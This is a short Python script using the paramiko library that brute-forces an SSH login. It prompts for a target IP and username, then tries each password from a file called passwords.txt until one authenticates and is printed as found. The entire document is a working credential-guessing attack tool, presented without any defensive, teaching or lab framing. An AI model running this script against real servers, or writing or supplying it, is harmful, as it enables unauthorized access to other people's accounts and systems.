import paramiko
import time

host = input("IP: ")
username = input("Username: ")

with open("passwords.txt") as file:
    passwords = file.readlines()

for password in passwords:
    password = password.strip()

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(host, username=username, password=password)

        print(f"[✔] FOUND: {password}")
        ssh.close()
        break

    except paramiko.AuthenticationException:
        print(f"[✖] Wrong: {password}")
        time.sleep(1)